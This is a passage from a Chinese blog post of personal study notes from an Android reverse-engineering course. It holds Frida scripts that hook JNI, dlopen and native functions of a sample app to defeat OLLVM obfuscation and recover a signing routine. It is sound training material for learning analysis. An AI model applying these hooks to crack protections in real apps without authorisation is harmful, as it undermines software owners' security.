    <content><![CDATA[<blockquote>
<p>看雪的安卓培训网课例子动手做了一遍，记录下Frida辅助分析OLLVM混淆的相关方法，，（自己记录总结备忘用的，详细的讲解还是推荐去听看雪的课，附件先暂不提供下载）。</p>
</blockquote>
<a id="more"></a>
<h2 id="L4：-Frida-辅助分析OLLVM字符串混淆"><a href="#L4：-Frida-辅助分析OLLVM字符串混淆" class="headerlink" title="L4： Frida 辅助分析OLLVM字符串混淆"></a>L4： Frida 辅助分析OLLVM字符串混淆</h2><p>hook_l4.js:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function print_str(addr)</span><br><span class="line">&#123;</span><br><span class="line">    var base_libjni = Module.findBaseAddress(&quot;libhello-jni.so&quot;);</span><br><span class="line">    var addr_str = base_libjni.add(addr);</span><br><span class="line">    console.log(&quot;str:&quot;,addr_str,ptr(addr_str).readCString());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function hook_native_001()</span><br><span class="line">&#123;</span><br><span class="line">    //v6 = off_33D60,</span><br><span class="line">    print_str(0x37070);</span><br><span class="line">    print_str(0x37080);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    print_str(0x37010);</span><br><span class="line">    print_str(0x37050);</span><br><span class="line">    print_str(0x370A8);</span><br><span class="line">    print_str(0x370C0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function hook_native_002()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    // *(_QWORD *)&amp;v6 = byte_3E1BA;</span><br><span class="line">    // *((_QWORD *)&amp;v6 + 1) = sub_6E4C;</span><br><span class="line">    // *(_QWORD *)&amp;xmmword_3E1E8 = &amp;dword_3E1B4;</span><br><span class="line">    // *(__int128 *)((char *)&amp;xmmword_3E1E8 + 8) = v6;</span><br><span class="line">    print_str(0x3E1B4);</span><br><span class="line">    print_str(0x3E1BA);</span><br><span class="line">&#125;</span><br><span class="line">function hook_libart()</span><br><span class="line">&#123;</span><br><span class="line">    //symbol   (no checkjni)</span><br><span class="line">    var module_libart = Process.findModuleByName(&quot;libart.so&quot;);</span><br><span class="line">    //or?const hooks = Module.load(&apos;libc.so&apos;);   var Symbol = hooks.enumerateSymbols();</span><br><span class="line">    var symbols = module_libart.enumerateSymbols();</span><br><span class="line">    </span><br><span class="line">    var addr_GetStringUTFChars = null;</span><br><span class="line">    var addr_FindClass = null;</span><br><span class="line">    var addr_GetStaticFieldID = null;</span><br><span class="line">    var addr_SetStaticIntField = null;</span><br><span class="line">    var addr_RegisterNatives = null;</span><br><span class="line"></span><br><span class="line">    for(var i = 0; i &lt; symbols.length;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        if (symbols[i].name.indexOf(&quot;art&quot;) != -1) &#123;</span><br><span class="line">            if (symbols[i].name.indexOf(&quot;CheckJNI&quot;) == -1) &#123;</span><br><span class="line">                if (symbols[i].name.indexOf(&quot;GetStringUTFChars&quot;) != -1) &#123;</span><br><span class="line">                    addr_GetStringUTFChars = symbols[i].address;</span><br><span class="line">                    console.log(symbols[i].name,addr_GetStringUTFChars);</span><br><span class="line">                &#125;</span><br><span class="line">                if (symbols[i].name.indexOf(&quot;art3JNI9FindClass&quot;) != -1) &#123;</span><br><span class="line">                    addr_FindClass = symbols[i].address;</span><br><span class="line">                    console.log(symbols[i].name,addr_FindClass);</span><br><span class="line">                &#125;</span><br><span class="line">                if (symbols[i].name.indexOf(&quot;GetStaticFieldID&quot;) != -1) &#123;</span><br><span class="line">                    addr_GetStaticFieldID = symbols[i].address;</span><br><span class="line">                    console.log(symbols[i].name,addr_GetStaticFieldID);</span><br><span class="line">                &#125;</span><br><span class="line">                if (symbols[i].name.indexOf(&quot;SetStaticIntField&quot;) != -1) &#123;</span><br><span class="line">                    addr_SetStaticIntField = symbols[i].address;</span><br><span class="line">                    console.log(symbols[i].name,addr_SetStaticIntField);</span><br><span class="line">                &#125;</span><br><span class="line">                if (symbols[i].name.indexOf(&quot;RegisterNatives&quot;) != -1) &#123;</span><br><span class="line">                    addr_RegisterNatives = symbols[i].address;</span><br><span class="line">                    console.log(symbols[i].name,addr_RegisterNatives);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    //print str </span><br><span class="line">    </span><br><span class="line">    // //print so stack  :  FUZZY and ACCURATE</span><br><span class="line">    // if (addr_GetStringUTFChars) &#123;</span><br><span class="line">    //     Interceptor.attach(addr_GetStringUTFChars,&#123;</span><br><span class="line">    //         onEnter : function(args)&#123;</span><br><span class="line">    //             // console.log(&apos;addr_GetStringUTFChars onEnter called from:\n&apos; +</span><br><span class="line">    //             //     Thread.backtrace(this.context, Backtracer.FUZZY)</span><br><span class="line">    //             //         .map(DebugSymbol.fromAddress).join(&apos;\n&apos;) + &apos;\n&apos;);</span><br><span class="line">    //         &#125;,</span><br><span class="line">    //         onLeave : function(retval)&#123;</span><br><span class="line">    //             console.log(&quot;GetStringUTFChars:&quot;,ptr(retval).readCString())</span><br><span class="line">    //         &#125;</span><br><span class="line">    //     &#125;);</span><br><span class="line">    // &#125;</span><br><span class="line">    </span><br><span class="line">    // if (addr_FindClass) &#123;</span><br><span class="line">    //     Interceptor.attach(addr_FindClass,&#123;</span><br><span class="line">    //         onEnter : function(args)&#123;</span><br><span class="line">    //             console.log(&quot;FindClass Arg:&quot;, ptr(args[1]).readCString());</span><br><span class="line">    //         &#125;,</span><br><span class="line">    //         onLeave : function(retval)&#123;</span><br><span class="line">    //         &#125;</span><br><span class="line">    //     &#125;);</span><br><span class="line">    // &#125;</span><br><span class="line">    </span><br><span class="line">    // if (addr_GetStaticFieldID) &#123;</span><br><span class="line">    //     Interceptor.attach(addr_GetStaticFieldID,&#123;</span><br><span class="line">    //         onEnter : function(args)&#123;</span><br><span class="line">    //             console.log(&quot;GetStaticFieldID Arg3:&quot;, ptr(args[2]).readCString(),&quot;Arg4:&quot;,ptr(args[3]).readCString());</span><br><span class="line">    //         &#125;,</span><br><span class="line">    //         onLeave : function(retval)&#123;</span><br><span class="line">    //         &#125;</span><br><span class="line">    //     &#125;);</span><br><span class="line">    // &#125;</span><br><span class="line">    </span><br><span class="line">    // if (addr_SetStaticIntField) &#123;</span><br><span class="line">    //     Interceptor.attach(addr_SetStaticIntField,&#123;</span><br><span class="line">    //         onEnter : function(args)&#123;</span><br><span class="line">    //             console.log(&quot;SetStaticIntField Arg4:&quot;,args[3]);</span><br><span class="line">    //         &#125;,</span><br><span class="line">    //         onLeave : function(retval)&#123;</span><br><span class="line">    //         &#125;</span><br><span class="line">    //     &#125;);</span><br><span class="line">    // &#125;</span><br><span class="line">    // //hook findclass getstaticfiledid </span><br><span class="line">    if (addr_RegisterNatives) &#123;</span><br><span class="line">        Interceptor.attach(addr_RegisterNatives,&#123;</span><br><span class="line">            onEnter : function(args)&#123;</span><br><span class="line">                console.log(&quot;addr_RegisterNatives:\n&quot;,hexdump(args[2]));</span><br><span class="line">                console.log(&quot;addr_RegisterNatives name:&quot;,ptr(args[2]).readPointer().readCString());</span><br><span class="line">                console.log(&quot;addr_RegisterNatives sign:&quot;,ptr(args[2]).add(Process.pointerSize).readPointer().readCString());</span><br><span class="line">            &#125;,</span><br><span class="line">            onLeave : function(retval)&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">function inline_hook()</span><br><span class="line">&#123;</span><br><span class="line">    //arm64稳定  arm32不稳定，x32可能会有2字节的thumb指令</span><br><span class="line">    var base_libjni = Module.findBaseAddress(&quot;libhello-jni.so&quot;);</span><br><span class="line">    console.log(&quot;base_libjni&quot;,base_libjni);</span><br><span class="line">    if (base_libjni != null) &#123;</span><br><span class="line">        var addr_hook = base_libjni.add(0x7320);</span><br><span class="line">        Interceptor.attach(addr_hook,&#123;</span><br><span class="line">            onEnter : function (args)&#123;</span><br><span class="line">                //w13 x13</span><br><span class="line">                console.log(&quot;xor:&quot;,this.context.x13);</span><br><span class="line">            &#125;,</span><br><span class="line">            onLeave : function(retval)&#123;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function hook_dlopen()</span><br><span class="line">&#123;</span><br><span class="line">    //android 6.0</span><br><span class="line">    var addr_dlopen = Module.findExportByName(null,&quot;dlopen&quot;);</span><br><span class="line">    Interceptor.attach(addr_dlopen,&#123;</span><br><span class="line">        onEnter : function (args)&#123;</span><br><span class="line">            this.flag = false;</span><br><span class="line">            var dlopen_name = ptr(args[0]).readCString();</span><br><span class="line">            console.log(&quot;android_dlopen_ext:&quot;,dlopen_name);</span><br><span class="line">            if(dlopen_name.indexOf(&quot;libhello-jni.so&quot;) &gt;= 0)&#123;</span><br><span class="line">                this.flag = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        onLeave : function(retval)&#123;</span><br><span class="line">            if(this.flag)&#123;</span><br><span class="line">                inline_hook();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    // 高版本Android系统</span><br><span class="line">    var addr_android_dlopen_ext = Module.findExportByName(null,&quot;android_dlopen_ext&quot;);</span><br><span class="line">    Interceptor.attach(addr_android_dlopen_ext,&#123;</span><br><span class="line">        onEnter : function (args)&#123;</span><br><span class="line">            this.flag = false;</span><br><span class="line">            var dlopen_name = ptr(args[0]).readCString();</span><br><span class="line">            console.log(&quot;android_dlopen_ext:&quot;,dlopen_name);</span><br><span class="line">            if(dlopen_name.indexOf(&quot;libhello-jni.so&quot;) &gt;= 0)&#123;</span><br><span class="line">                this.flag = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        onLeave : function(retval)&#123;</span><br><span class="line">            if(this.flag)&#123;</span><br><span class="line">                inline_hook();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function main()</span><br><span class="line">&#123;</span><br><span class="line">    hook_dlopen()</span><br><span class="line">    hook_libart()</span><br><span class="line">    //hook_native_001();</span><br><span class="line">    //hook_native_002();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setImmediate(main)</span><br></pre></td></tr></table></figure>
<h2 id="L5-Frida-辅助分析OLLVM-控制流平坦化"><a href="#L5-Frida-辅助分析OLLVM-控制流平坦化" class="headerlink" title="L5: Frida 辅助分析OLLVM 控制流平坦化"></a>L5: Frida 辅助分析OLLVM 控制流平坦化</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function hook_java() &#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        var hello_jni = Java.use(&quot;com.example.hellojni.HelloJni&quot;);</span><br><span class="line">        hello_jni.sign2.implementation = function(str,str2)&#123;</span><br><span class="line">            var ret = this.sign2(str,str2);</span><br><span class="line">            console.log(&quot;sign2 arg1:&quot;,str,&quot;arg2:&quot;,str2,&quot;ret:&quot;,ret);</span><br><span class="line">            return ret;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function call_sign2()</span><br><span class="line">&#123;</span><br><span class="line">    //设置固定值注定调用</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        Java.choose(&quot;com.example.hellojni.HelloJni&quot;,&#123;</span><br><span class="line">            onMatch:function(instance)&#123;</span><br><span class="line">                console.log(&quot;instance:&quot;,instance.sign2(&quot;0123456789&quot;,&quot;abcdefgh&quot;))</span><br><span class="line">            &#125;,</span><br><span class="line">            onComplete:function(ret)</span><br><span class="line">            &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function hook_native() &#123;</span><br><span class="line">    var base_libjni = Module.findBaseAddress(&quot;libhello-jni.so&quot;);</span><br><span class="line">    var sub_13558 = base_libjni.add(0x13558);</span><br><span class="line">    //根据输入及返回结果交叉引用，首要分析sub函数。</span><br><span class="line">    // Interceptor.attach(sub_13558,&#123;</span><br><span class="line">    //     onEnter:function(args)&#123;</span><br><span class="line">    //         this.arg0 = args[0];</span><br><span class="line">    //         console.log(&quot;sub_13558 OnEnter: arg1=&quot;,ptr(args[1]).readCString(),&quot;arg2=&quot;,args[2]);</span><br><span class="line">    //     &#125;,</span><br><span class="line">    //     onLeave:function(retval)&#123;</span><br><span class="line">    //         console.log(&quot;sub_13558 onLeave: arg0=&quot;,ptr(this.arg0).add(1).readCString());</span><br><span class="line">    //         console.log(&quot;sub_13558 onLeave: retval=&quot;,ptr(retval).readCString());</span><br><span class="line">    //     &#125;</span><br><span class="line">    // &#125;)</span><br><span class="line"></span><br><span class="line">    // var sub_12D70 = base_libjni.add(0x12D70);</span><br><span class="line">    // Interceptor.attach(sub_12D70,&#123;</span><br><span class="line">    //     onEnter:function(args)&#123;</span><br><span class="line">    //         this.str1 = args[0];</span><br><span class="line">    //         this.str2 = args[1];</span><br><span class="line">    //         this.v51 = args[2];</span><br><span class="line">    //         console.log(&quot;sub_12D70 arg0:&quot;,ptr(args[0]).add(1).readCString(),&quot;arg1:&quot;,ptr(args[1]).add(1).readCString(),&quot;\n&quot;);</span><br><span class="line">    //     &#125;,</span><br><span class="line">    //     onLeave(retval)&#123;</span><br><span class="line">    //         console.log(&quot;sub_12D70 ret arg0:&quot;,ptr(this.str1).add(1).readCString(),&quot;arg1:&quot;,ptr(this.str2).add(1).readCString(),&quot;\n&quot;);</span><br><span class="line">    //         console.log(&quot;sub_12D70 ret arg2:\n&quot;,hexdump(ptr(this.v51).readPointer()));      </span><br><span class="line">    //     &#125;</span><br><span class="line">    // &#125;)</span><br><span class="line"></span><br><span class="line">    var sub_162b8 = base_libjni.add(0x162b8);</span><br><span class="line">    // Interceptor.attach(sub_162b8,&#123;</span><br><span class="line">    //     onEnter:function(args)&#123;</span><br><span class="line">    //         this.arg0 = args[0];</span><br><span class="line">    //         this.arg1 = args[1];</span><br><span class="line">    //         this.arg2 = args[2];</span><br><span class="line">    //         console.log(&quot;sub_162b8 arg0:\n&quot;,ptr(args[0]).readCString(),&quot;\narg1:\n&quot;,args[1],&quot;\n&quot;);</span><br><span class="line">    //     &#125;,</span><br><span class="line">    //     onLeave(retval)&#123;</span><br><span class="line">    //         //console.log(&quot;sub_162b8 ret arg0:&quot;,hexdump(this.arg0),&quot;arg1:&quot;,hexdump(this.arg1),&quot;\n&quot;);</span><br><span class="line">    //         console.log(&quot;sub_162b8 ret arg2:\n&quot;,ptr(this.arg2).readLong());      </span><br><span class="line">            </span><br><span class="line">    //         console.log(&quot;sub_162b8 retval\n&quot;,ptr(retval).readCString());</span><br><span class="line">    //     &#125;</span><br><span class="line">    // &#125;)</span><br><span class="line"></span><br><span class="line">    var sub_130F0 = base_libjni.add(0x130F0);</span><br><span class="line">    // Interceptor.attach(sub_130F0,&#123;</span><br><span class="line">    //     onEnter:function(args)&#123;</span><br><span class="line">    //         this.arg0 = args[0];</span><br><span class="line">    //         console.log(&quot;sub_130F0 arg0:\n&quot;,hexdump(args[0],&#123; offset: 0, length: 64, header: true, ansi: true &#125;),&quot;\narg1:\n&quot;,ptr(args[1]).readCString(),&quot;\narg2:\n&quot;,args[2]);</span><br><span class="line">    //     &#125;,</span><br><span class="line">    //     onLeave(retval)&#123;</span><br><span class="line">    //         console.log(&quot;sub_130F0 ret arg0:\n&quot;,hexdump(this.arg0,&#123; offset: 0, length: 64, header: true, ansi: true &#125;));      </span><br><span class="line">    //     &#125;</span><br><span class="line">    // &#125;)</span><br><span class="line"></span><br><span class="line">    var sub_154D4 = base_libjni.add(0x154D4);</span><br><span class="line">    Interceptor.attach(sub_154D4,&#123;</span><br><span class="line">        onEnter:function(args)&#123;</span><br><span class="line">            this.arg0 = args[0];</span><br><span class="line">            this.arg1 = args[1];</span><br><span class="line">            this.arg2 = args[2];</span><br><span class="line">            console.log(&quot;sub_154D4 OnEnter: arg0=&quot;,hexdump(this.arg0,&#123; offset: 0, length: 64, header: true, ansi: true &#125;));   </span><br><span class="line">            console.log(&quot;sub_154D4 OnEnter: arg1=&quot;,hexdump(this.arg1,&#123; offset: 0, length: 64, header: true, ansi: true &#125;));   </span><br><span class="line">            console.log(&quot;sub_154D4 OnEnter: arg2=&quot;,args[2]);</span><br><span class="line">        &#125;,</span><br><span class="line">        onLeave(retval)&#123;</span><br><span class="line">            console.log(&quot;sub_154D4 OnLeave: arg0=&quot;,hexdump(this.arg0,&#123; offset: 0, length: 64, header: true, ansi: true &#125;));   </span><br><span class="line">            console.log(&quot;sub_154D4 OnLeave: arg1=&quot;,hexdump(this.arg1,&#123; offset: 0, length: 64, header: true, ansi: true &#125;));   </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    var sub_14844 = base_libjni.add(0x14844);</span><br><span class="line">    Interceptor.attach(sub_14844,&#123;</span><br><span class="line">        onEnter:function(args)&#123;</span><br><span class="line">            this.arg0 = args[0];</span><br><span class="line">            this.arg1 = args[1];</span><br><span class="line">            console.log(&quot;sub_14844 OnEnter: arg0=&quot;,hexdump(this.arg0,&#123; offset: 0, length: 64, header: true, ansi: true &#125;));   </span><br><span class="line">            console.log(&quot;sub_14844 OnEnter: arg1=&quot;,hexdump(this.arg1,&#123; offset: 0, length: 64, header: true, ansi: true &#125;));   </span><br><span class="line">        &#125;,</span><br><span class="line">        onLeave(retval)&#123;</span><br><span class="line">            console.log(&quot;sub_14844 OnLeave: arg0=&quot;,hexdump(this.arg0,&#123; offset: 0, length: 64, header: true, ansi: true &#125;));   </span><br><span class="line">            console.log(&quot;sub_14844 OnLeave: arg1=&quot;,hexdump(this.arg1,&#123; offset: 0, length: 64, header: true, ansi: true &#125;));   </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    var sub_158AC = base_libjni.add(0x158AC);</span><br><span class="line">    Interceptor.attach(sub_158AC,&#123;</span><br><span class="line">        onEnter:function(args)&#123;</span><br><span class="line">            this.arg0 = args[0];</span><br><span class="line">            this.arg1 = args[1];</span><br><span class="line">            console.log(&quot;sub_158AC OnEnter: arg0=&quot;,hexdump(this.arg0,&#123; offset: 0, length: 64, header: true, ansi: true &#125;));      </span><br><span class="line">            console.log(&quot;sub_158AC OnEnter: arg1=&quot;,hexdump(this.arg1,&#123; offset: 0, length: 64, header: true, ansi: true &#125;));      </span><br><span class="line">        &#125;,</span><br><span class="line">        onLeave(retval)&#123;</span><br><span class="line">            console.log(&quot;sub_158AC OnLeave: arg0=&quot;,hexdump(this.arg0,&#123; offset: 0, length: 64, header: true, ansi: true &#125;)); </span><br><span class="line">            console.log(&quot;sub_158AC OnLeave: arg1=&quot;,hexdump(this.arg1,&#123; offset: 0, length: 64, header: true, ansi: true &#125;));      </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    var sub_15F1C = base_libjni.add(0x15F1C);</span><br><span class="line">    // Interceptor.attach(sub_15F1C,&#123;</span><br><span class="line">    //     onEnter:function(args)&#123;</span><br><span class="line">    //         this.arg0 = args[0];</span><br><span class="line">    //         this.arg2 = args[2];</span><br><span class="line">    //         console.log(&quot;sub_15F1C OnEnter: arg0=&quot;,ptr(args[0]).readCString(),&quot;arg1=&quot;,args[1],&quot;arg2=&quot;,args[2]);</span><br><span class="line">    //     &#125;,</span><br><span class="line">    //     onLeave(retval)&#123;</span><br><span class="line">    //         console.log(&quot;sub_15F1C OnLeave: arg2=\n&quot;,hexdump(this.arg2,&#123; offset: 0, length: 64, header: true, ansi: true &#125;));      </span><br><span class="line">    //     &#125;</span><br><span class="line">    // &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function main() &#123;</span><br><span class="line">    hook_java()</span><br><span class="line">    hook_native();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setImmediate(main);</span><br></pre></td></tr></table></figure>

<h2 id="L6-1：-Frida-辅助分析OLLVM-指令替换"><a href="#L6-1：-Frida-辅助分析OLLVM-指令替换" class="headerlink" title="L6.1： Frida 辅助分析OLLVM 指令替换"></a>L6.1： Frida 辅助分析OLLVM 指令替换</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function hook_java()</span><br><span class="line">&#123;</span><br><span class="line">    // Java.perform(function()&#123;</span><br><span class="line">    //     var hellojni = Java.use(&quot;com.example.hellojni.HelloJni&quot;);</span><br><span class="line">    //     hellojni.sign2.implementation = function(str1,str2)&#123;</span><br><span class="line">    //         var ret = this.sign2(str1,str2);</span><br><span class="line">    //         console.log(&quot;sign2: arg1=&quot;,str1,&quot; arg2=&quot;,str2,&quot; ret=&quot;,ret);</span><br><span class="line">    //         return ret;</span><br><span class="line">    //     &#125;</span><br><span class="line">    // &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function call_sign2()</span><br><span class="line">&#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        Java.choose(&quot;com.example.hellojni.HelloJni&quot;,&#123;</span><br><span class="line">            onMatch:function(instance)&#123;</span><br><span class="line">                instance.sign2(&quot;0123456789&quot;,&quot;abcdefgh&quot;)</span><br><span class="line">            &#125;,</span><br><span class="line">            onComplete:function(ret)</span><br><span class="line">            &#123;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function hook_native()</span><br><span class="line">&#123;</span><br><span class="line">    var libjni_base = Module.findBaseAddress(&quot;libhello-jni.so&quot;);</span><br><span class="line">    var sign2 = Module.findExportByName(&quot;libhello-jni.so&quot;,&quot;Java_com_example_hellojni_HelloJni_sign2&quot;);</span><br><span class="line">    console.log(&quot;base:&quot;,libjni_base,&quot;sign2:&quot;,sign2);</span><br><span class="line">    Interceptor.attach(sign2,&#123;</span><br><span class="line">        onEnter:function(args)&#123;</span><br><span class="line">            this.str1 = args[2];</span><br><span class="line">            this.str2 = args[3];</span><br><span class="line">            //https://github.com/frida/frida-java-bridge/search?q=GetStringUTFChars&amp;unscoped_q=GetStringUTFChars</span><br><span class="line">            console.log(&quot;Native: str1=&quot;,ptr(Java.vm.tryGetEnv().getStringUtfChars(this.str1)).readCString(),&quot; str2=&quot;,ptr(Java.vm.tryGetEnv().getStringUtfChars(this.str2)).readCString());</span><br><span class="line">        &#125;,</span><br><span class="line">        onLeave:function(retval)&#123;</span><br><span class="line">            console.log(&quot;Native: retval=&quot;,ptr(Java.vm.tryGetEnv().getStringUtfChars(retval)).readCString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    var sub_1DFB4 = libjni_base.add(0x1DFB4);</span><br><span class="line">    // Interceptor.attach(sub_1DFB4,&#123;</span><br><span class="line">    //     onEnter:function(args)&#123;</span><br><span class="line">    //         this.arg0 = args[0];</span><br><span class="line">    //         this.arg1 = args[1];</span><br><span class="line">    //         //ida 里面可能识别的不对，需要分析下参数传递是否正确</span><br><span class="line">    //         //void __usercall sub_1DFB4(_QWORD *a1@&lt;X0&gt;, _QWORD *a2@&lt;X1&gt;)</span><br><span class="line">    //         console.log(&quot;sub_1DFB4 onEnter: str1=&quot;,ptr(this.arg0).add(1).readCString(),&quot; str2=&quot;,ptr(this.arg1).add(1).readCString());</span><br><span class="line">    //     &#125;,</span><br><span class="line">    //     onLeave:function(retval)&#123;</span><br><span class="line">    //         console.log(&quot;sub_1DFB4 onLeave: retval=&quot;,ptr(retval).readCString());</span><br><span class="line">    //     &#125;</span><br><span class="line">    // &#125;)</span><br><span class="line"></span><br><span class="line">    var sub_1E298 = libjni_base.add(0x1E298);</span><br><span class="line">    // Interceptor.attach(sub_1E298,&#123;</span><br><span class="line">    //     onEnter:function(args)&#123;</span><br><span class="line">    //         this.arg0 = args[0];</span><br><span class="line">    //         this.arg1 = args[1];</span><br><span class="line">    //         this.arg2 = args[2];</span><br><span class="line">    //         console.log(&quot;sub_1E298 onEnter: str1=&quot;,ptr(this.arg0).add(1).readCString(),&quot; str2=&quot;,ptr(this.arg1).add(1).readCString());</span><br><span class="line">    //     &#125;,</span><br><span class="line">    //     onLeave:function(retval)&#123;</span><br><span class="line">    //         console.log(&quot;sub_1E298 onLeave: retval=&quot;,ptr(retval).add(1).readCString());</span><br><span class="line">    //         console.log(&quot;sub_1E298 onLeave: arg2=&quot;,hexdump(ptr(this.arg2).readPointer()));</span><br><span class="line">    //     &#125;</span><br><span class="line">    // &#125;)</span><br><span class="line"></span><br><span class="line">    var sub_1AB4C = libjni_base.add(0x1AB4C);</span><br><span class="line">    Interceptor.attach(sub_1AB4C,&#123;</span><br><span class="line">        onEnter:function(args)&#123;</span><br><span class="line">            this.arg0 = args[0];</span><br><span class="line">            this.arg1 = args[1];</span><br><span class="line">            this.arg2 = args[2];</span><br><span class="line">            console.log(&quot;sub_1AB4C onEnter: arg0=&quot;,ptr(this.arg0).readCString(),&quot; arg1=&quot;,this.arg1);</span><br><span class="line">        &#125;,</span><br><span class="line">        onLeave:function(retval)&#123;</span><br><span class="line">            console.log(&quot;sub_1AB4C onLeave: arg2=&quot;,hexdump(this.arg2,&#123; offset: 0, length: 16, header: true, ansi: true &#125;));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    var sub_171C4 = libjni_base.add(0x171C4);</span><br><span class="line">    Interceptor.attach(sub_171C4,&#123;</span><br><span class="line">        onEnter:function(args)&#123;</span><br><span class="line">            this.arg0 = args[0];</span><br><span class="line">            this.arg1 = args[1];</span><br><span class="line">            console.log(&quot;sub_171C4 onEnter: arg0=&quot;,hexdump(this.arg0,&#123; offset: 0, length: 80, header: true, ansi: true &#125;));</span><br><span class="line">            console.log(&quot;sub_171C4 onEnter: arg1=&quot;,hexdump(this.arg1,&#123; offset: 0, length: 80, header: true, ansi: true &#125;));</span><br><span class="line">        &#125;,</span><br><span class="line">        onLeave:function(retval)&#123;</span><br><span class="line">            console.log(&quot;sub_171C4 onLeave: retval=&quot;,hexdump(retval,&#123; offset: 0, length: 80, header: true, ansi: true &#125;));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    var sub_18490 = libjni_base.add(0x18490);</span><br><span class="line">    Interceptor.attach(sub_18490,&#123;</span><br><span class="line">        onEnter:function(args)&#123;</span><br><span class="line">            this.arg0 = args[0];</span><br><span class="line">            this.arg1 = args[1];</span><br><span class="line">            console.log(&quot;sub_18490 onEnter: arg0=&quot;,hexdump(this.arg0,&#123; offset: 0, length: 80, header: true, ansi: true &#125;));</span><br><span class="line">            console.log(&quot;sub_18490 onEnter: arg1=&quot;,hexdump(this.arg1,&#123; offset: 0, length: 80, header: true, ansi: true &#125;));</span><br><span class="line">        &#125;,</span><br><span class="line">        onLeave:function(retval)&#123; </span><br><span class="line">            console.log(&quot;sub_18490 onLeave: arg0=&quot;,hexdump(this.arg0,&#123; offset: 0, length: 80, header: true, ansi: true &#125;));</span><br><span class="line">            console.log(&quot;sub_18490 onLeave: arg1=&quot;,hexdump(this.arg1,&#123; offset: 0, length: 80, header: true, ansi: true &#125;));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function main()</span><br><span class="line">&#123;</span><br><span class="line">    hook_java();</span><br><span class="line">    hook_native();</span><br><span class="line">&#125;</span><br><span class="line">setImmediate(main)</span><br></pre></td></tr></table></figure>
<h2 id="L6-2：-Frida-辅助分析OLLVM-控制流混淆"><a href="#L6-2：-Frida-辅助分析OLLVM-控制流混淆" class="headerlink" title="L6.2： Frida 辅助分析OLLVM 控制流混淆"></a>L6.2： Frida 辅助分析OLLVM 控制流混淆</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function hook_java()</span><br><span class="line">&#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        var hello_jni = Java.use(&quot;com.example.hellojni.HelloJni&quot;);</span><br><span class="line">        hello_jni.sign2.implementation = function(str1,str2)&#123;</span><br><span class="line">            var ret = this.sign2(str1,str2);</span><br><span class="line">            console.log(&quot;sign2: arg1=&quot;,str1,&quot;arg2=&quot;,str2,&quot;ret=&quot;,ret);</span><br><span class="line">            return ret;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function call_sign2()</span><br><span class="line">&#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        Java.choose(&quot;com.example.hellojni.HelloJni&quot;,&#123;</span><br><span class="line">            onMatch:function(instance)&#123;</span><br><span class="line">                instance.sign2(&quot;0123456789&quot;,&quot;abcdefgh&quot;)</span><br><span class="line">            &#125;,</span><br><span class="line">            onComplete:function(ret)&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function hook_native()</span><br><span class="line">&#123;</span><br><span class="line">    var libjni_base = Module.findBaseAddress(&quot;libhello-jni.so&quot;);</span><br><span class="line">    var sign2 = Module.findExportByName(&quot;libhello-jni.so&quot;,&quot;Java_com_example_hellojni_HelloJni_sign2&quot;);</span><br><span class="line">    console.log(&quot;base:&quot;,libjni_base,&quot;sign2:&quot;,sign2);</span><br><span class="line"></span><br><span 